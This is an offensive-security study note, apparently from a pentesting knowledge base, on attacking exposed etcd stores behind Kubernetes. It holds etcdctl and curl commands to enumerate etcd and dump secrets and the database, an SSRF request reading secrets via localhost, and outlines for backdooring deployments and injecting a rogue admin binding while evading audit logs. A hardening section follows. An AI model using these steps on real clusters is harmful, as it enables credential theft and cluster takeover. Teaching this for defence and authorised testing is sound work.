---
tags: [etcd, kubernetes, key-value, unauthenticated, lateral-movement]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.22 etcd"
---

# etcd — Exposed Key-Value Store

## 1. Introduction to etcd

etcd is an open-source, strongly consistent, distributed key-value store that provides a reliable way to store data that needs to be accessed by a distributed system or cluster of machines. It gracefully handles leader elections during network partitions and can tolerate machine failure, making it a highly reliable and highly available datastore.

In modern cloud-native architectures, etcd is most famously known as the primary backing datastore for Kubernetes (K8s). It stores all of the cluster's state, configuration data, metadata, and crucially, all Kubernetes Secrets. Because of its critical role, compromising the etcd cluster essentially equates to a complete, unmitigated compromise of the entire Kubernetes cluster it supports. If an attacker can read from etcd, they can steal sensitive tokens (e.g., service account tokens, database passwords). If they can write to etcd, they can arbitrarily alter the cluster state, deploy malicious containers, or elevate privileges, effectively gaining cluster admin control.

## 2. Architecture & Role in Cloud Native Environments

etcd uses the Raft consensus algorithm to manage a highly available replicated log. In a typical production deployment, an etcd cluster consists of 3 or 5 nodes to maintain quorum. The nodes communicate with each other over a dedicated peer port (usually `2380`), while client applications interact with the cluster over a client port (usually `2379`).

### Key Concepts:
- **Keys and Values:** Data is stored hierarchically. In K8s, keys typically start with `/registry/`.
- **Raft Consensus:** Ensures that all nodes agree on the state of the data. If a leader node fails, a new leader is elected.
- **gRPC API:** While etcd v2 used a simple REST/HTTP API, etcd v3 uses gRPC for client communication, with an optional HTTP/gRPC gateway for backward compatibility.
- **Authentication and TLS:** By default, etcd does *not* require authentication. In secure deployments, mTLS (mutual TLS) is implemented to ensure only authorized clients (like the Kubernetes API server) can communicate with it.

## 3. ASCII Diagram: etcd Attack Flow

```text
      [ Attacker / Compromised Pod ]
                 |
                 | (1) Scans for Port 2379 / 2380
                 v
      +------------------------+
      |  Target Node / Network |
      |                        |
      |   [ etcd Service ]     | <-- (2) No mTLS / Unauthenticated Access
      |   Port: 2379 (Client)  |
      |   Port: 2380 (Peer)    |
      +------------------------+
                 |
                 | (3) Query /registry/secrets/
                 v
      +------------------------+
      |   Extracted Secrets    |
      |  - Service Accounts    |
      |  - TLS Certificates    |
      |  - DB Passwords        |
      +------------------------+
                 |
                 | (4) Token used to hit Kube API
                 v
      +------------------------+
      | Kubernetes API Server  | --> (5) Cluster Takeover!
      +------------------------+
```

## 4. Port & Default Configuration

- **2379/TCP:** Client connections (Used by clients like Kube API Server to read/write state).
- **2380/TCP:** Peer connections (Used for server-to-server communication and leader election).

**Common Misconfigurations:**
1. **Unauthenticated Access:** etcd deployed without client authentication enabled.
2. **Exposed Ports:** Ports 2379/2380 exposed to the internet or broadly across the internal network without proper Network Policies.
3. **Missing mTLS:** TLS is used for encryption, but client certificates are not verified (`--client-cert-auth=false`), allowing anyone to connect.
4. **Anonymous Auth Enabled:** Role-Based Access Control (RBAC) is configured, but the `guest` role has excessive permissions.

## 5. Reconnaissance & Enumeration

When you discover an open port 2379, the first step is to determine if it is an etcd service and whether it requires authentication.

### Nmap Scanning

```bash
# Basic scan for etcd ports
nmap -p 2379,2380 <target-ip> -sV -sC

# Using nmap scripts specifically for etcd
nmap -p 2379 --script etcd-info <target-ip>
```

### Checking etcd Version & Health (v3 API)

etcdctl is the official command-line tool. It's crucial to set the API version environment variable, as v3 is the standard for modern deployments.

```bash
export ETCDCTL_API=3

# Check version
etcdctl --endpoints=http://<target-ip>:2379 version

# Check cluster health
etcdctl --endpoints=http://<target-ip>:2379 endpoint health
```

If the endpoint returns healthy without requiring certificates, you have unauthenticated access. If it complains about TLS, you may need to use HTTPS.

```bash
# If TLS is enabled but client auth is not:
etcdctl --endpoints=https://<target-ip>:2379 --insecure-skip-tls-verify endpoint health
```

### Direct HTTP/REST Enumeration (v2 API)

Although deprecated, many clusters still expose the v2 API endpoints.

```bash
# Get version
curl http://<target-ip>:2379/version

# List keys (v2 API)
curl http://<target-ip>:2379/v2/keys/?recursive=true
```

## 6. Exploitation: Reading Secrets (Information Disclosure)

If etcd is exposed without mTLS or authentication, an attacker can dump the entire database. In a Kubernetes context, this is a goldmine.

### Listing All Keys (v3 API)

```bash
export ETCDCTL_API=3
etcdctl --endpoints=http://<target-ip>:2379 get / --prefix --keys-only
```

### Searching for Kubernetes Secrets

Kubernetes stores its data under the `/registry/` prefix. Secrets are typically stored under `/registry/secrets/`.

```bash
# List all K8s secrets
etcdctl --endpoints=http://<target-ip>:2379 get /registry/secrets/ --prefix --keys-only

# Extract a specific default service account token
etcdctl --endpoints=http://<target-ip>:2379 get /registry/secrets/default/default-token-abcde
```

### Dumping the Entire Database

To comprehensively analyze the cluster offline, you can dump all keys and values.

```bash
etcdctl --endpoints=http://<target-ip>:2379 get / --prefix > etcd_dump.txt
```
*Note: The output may contain unprintable characters or protobuf-encoded K8s objects, so piping through `strings` or using specialized decoding scripts is often necessary.*

```bash
# Parsing protobuf K8s secrets from etcd dump
cat etcd_dump.txt | strings | grep -i "ey" # Looking for JWT tokens
```

## 7. Exploitation: Writing Data / Cluster Takeover

Reading from etcd is devastating, but writing to it allows for direct and absolute cluster manipulation, bypassing the Kubernetes API Server entirely. This means audit logs configured on the Kube API Server will *not* record your actions, making this a stealthy takeover vector.

### Scenario: Backdooring a Workload

If an attacker modifies a Deployment object directly in etcd, the Kube Controller Manager will eventually reconcile the state, pulling the new image or executing the new command.

However, K8s objects in etcd v3 are stored as Protocol Buffers (protobuf), not JSON. Directly writing raw JSON via `etcdctl put` will break the Kube API server's ability to read that object.

**The Attack Path (Simplified):**
1. Read the protobuf object of a target deployment.
2. Deserialize it using K8s libraries.
3. Modify the container image or command to include a reverse shell.
4. Serialize it back to protobuf.
5. Write the modified protobuf back to etcd.
*(Tooling like `auger` can be used to decode/encode etcd K8s objects).*

### Scenario: Creating a Rogue ClusterRoleBinding

A more direct route if you have cluster-admin tokens from the dump is to just use `kubectl`. But if tokens are rotated or invalid, you could theoretically inject a new `ClusterRoleBinding` directly into etcd mapping the `system:anonymous` user to `cluster-admin`.

## 8. Exploiting etcd via Server-Side Request Forgery (SSRF)

Even if etcd is bound only to `localhost` (`127.0.0.1`), it can still be attacked if an SSRF vulnerability exists in an application running on the same node (e.g., a pod running in the host network namespace).

Because the v2 API relies on simple HTTP GET/PUT requests, a basic SSRF can be leveraged to read K8s secrets or modify configuration.

```http
# SSRF payload to read K8s secrets via local etcd
GET /?url=http://127.0.0.1:2379/v2/keys/registry/secrets/default/default-token-xxxxx HTTP/1.1
Host: vulnerable-app.com
```

Even for the v3 API (gRPC), the HTTP gateway is often enabled, allowing SSRF attacks to succeed via RESTful paths like `/v3/kv/range`.

## 9. Defense & Hardening

Securing etcd is paramount to securing the entire infrastructure it supports.

### 1. Enable Mutual TLS (mTLS)
The most critical defense. Both the client and the server must present valid certificates signed by a trusted Certificate Authority (CA).
```ini
# etcd startup flags
--client-cert-auth=true
--trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
--cert-file=/etc/kubernetes/pki/etcd/server.crt
--key-file=/etc/kubernetes/pki/etcd/server.key
```

### 2. Network Segmentation & Firewalling
etcd ports (2379, 2380) should strictly be accessible only by the Kube API Server nodes and other etcd peer nodes.
- Use cloud provider Security Groups.
- Implement strict iptables/firewalld rules on the master nodes.

### 3. Role-Based Access Control (RBAC)
If mTLS cannot be used for all clients, enable etcd's built-in RBAC to restrict what authenticated users can read or write. Disable the anonymous/guest user entirely.

### 4. Bind to Localhost/Specific Interfaces
Do not bind etcd to `0.0.0.0`. Bind it strictly to the internal network interface or `127.0.0.1` if only local components (like a co-located Kube API server) need to access it.

### 5. Encrypt K8s Secrets at Rest
By default, K8s secrets are stored in plaintext (base64 is not encryption) within etcd. Configure K8s to use an external KMS (Key Management Service) to encrypt secrets before writing them to etcd. Even if etcd is compromised, the secrets remain encrypted.

## 10. Chaining Opportunities

- **SSRF to etcd:** Use an SSRF vulnerability in a web application to hit `http://127.0.0.1:2379`, dumping K8s secrets. Link to `[[05 - Server-Side Request Forgery (SSRF)]]`.
- **etcd to K8s API Takeover:** Use the extracted `default-token` to authenticate to the Kube API server. Link to `[[40 - Kubernetes API Server Exploitation]]` (hypothetical topic).
- **Lateral Movement:** Extracted database credentials or SSH keys from etcd can be used to pivot into other subnets or traditional VM infrastructure. Link to `[[20 - Pivoting and Port Forwarding]]`.

## 11. Related Notes

- `[[23 - Consul — Service Mesh Misconfig]]`
- `[[24 - Zookeeper — Unauthenticated Access]]`
- `[[08 - JSON Web Tokens (JWT) Attacks]]` (Often extracted from etcd)
- `[[30 - Infrastructure as Code (IaC) Security]]`
